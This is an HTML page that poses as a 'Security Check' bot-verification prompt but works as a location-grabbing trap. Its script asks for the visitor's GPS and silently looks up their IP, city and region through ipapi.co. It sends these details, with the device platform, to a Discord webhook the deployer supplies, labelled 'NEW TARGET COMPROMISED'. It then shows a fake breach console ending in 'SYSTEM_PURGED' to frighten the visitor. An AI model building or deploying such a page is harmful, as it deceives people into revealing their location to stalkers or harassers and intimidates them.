<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification Required</title> 
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
            /* Using a high-quality nature background as a fallback if your specific link fails */
            background: url('https://images.unsplash.com/photo-1500622764614-be3c178304c3?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed; 
            background-size: cover;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex; align-items: center; justify-content: center;
        }

        /* THE OVERLAY TO MAKE THE IMAGE LOOK "FIRE" */
        body::before {
            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.2); z-index: 1;
        }

        /* THE VERIFICATION BOX */
        #verify-box {
            position: relative; z-index: 10;
            background: rgba(255, 255, 255, 0.98);
            padding: 40px 30px; border-radius: 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            text-align: center; width: 85%; max-width: 380px;
            border: 1px solid rgba(255,255,255,0.3);
        }

        h2 { color: #1a1a1a; margin: 0 0 10px 0; font-size: 1.6rem; }
        p { color: #555; font-size: 0.95rem; line-height: 1.5; margin-bottom: 30px; }

        #start-btn { 
            background: #007bff; color: white; border: none; 
            padding: 16px; font-size: 1.1rem; border-radius: 10px;
            cursor: pointer; font-weight: 600; width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,123,255,0.4);
        }

        #start-btn:hover { background: #0056b3; transform: translateY(-2px); }

        /* THE HACKER CONSOLE (HIDDEN) */
        #console { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 100; 
            display: none; flex-direction: column; align-items: center; justify-content: center;
            color: #00FF41; font-family: 'Courier New', monospace;
        }
        #log { width: 90%; max-width: 600px; line-height: 1.6; }
    </style>
</head>
<body>

    <div id="verify-box">
        <div style="font-size: 50px; margin-bottom: 15px;">🛡️</div>
        <h2>Security Check</h2>
        <p>Verification is required to proceed. Please click below to confirm you are not a bot.</p>
        <button id="start-btn" onclick="startTrap()">[ VERIFY IDENTITY ]</button>
    </div>

    <div id="console">
        <div id="log">
            <h1 style="color:red; text-shadow: 0 0 10px red;">> [ BREACH_INITIALIZED ]</h1>
            <div id="output"></div>
        </div>
    </div>

    <script>
        // PASTE YOUR DISCORD WEBHOOK URL BELOW
        const WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"; 

        function startTrap() {
            // STEP 1: Ask for REAL GPS (The Trap)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
                    () => sendData("DENIED", "DENIED", "0")
                );
            } else {
                sendData("NOT_SUPPORTED", "NOT_SUPPORTED", "0");
            }

            // STEP 2: Show the Scary Screen
            document.getElementById('verify-box').style.display = 'none';
            document.getElementById('console').style.display = 'flex';
            runHackerTyping();
        }

        async function sendData(lat, lon, acc) {
            // Get IP info silently
            const response = await fetch('https://ipapi.co/json/');
            const ipData = await response.json();

            const discordMessage = {
                content: "💀 **NEW TARGET COMPROMISED** 💀",
                embeds: [{
                    title: "System Exploit Report",
                    color: 16711680, // Red
                    fields: [
                        { name: "🌐 IP Address", value: ipData.ip, inline: true },
                        { name: "📍 City/Region", value: `${ipData.city}, ${ipData.region}`, inline: true },
                        { name: "🎯 Real GPS", value: lat !== "DENIED" ? `[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})` : "❌ DENIED", inline: false },
                        { name: "📱 Device", value: navigator.platform, inline: true }
                    ],
                    footer: { text: "Mody12_S Deep Scan v10.2" }
                }]
            };

            fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(discordMessage) });
        }

        function runHackerTyping() {
            const lines = [
                "BYPASSING BROWSER_ENCRYPTION...",
                "LOCATING SYSTEM_CORE...",
                "UPLOADING TROJAN_PAYLOAD...",
                "ACCESSING LOCAL_FILES...",
                "CRITICAL: SECURITY_TRACE_DETECTED!",
                "EMERGENCY_WIPE_INITIALIZED..."
            ];
            let i = 0;
            const output = document.getElementById('output');
            const interval = setInterval(() => {
                if (i < lines.length) {
                    output.innerHTML += `<p>> ${lines[i]}</p>`;
                    i++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-size:4rem; font-family:monospace;'>SYSTEM_PURGED</h1>";
                        document.body.style.background = "black";
                    }, 2000);
                }
            }, 1000);
        }
    </script>
</body>
</html>
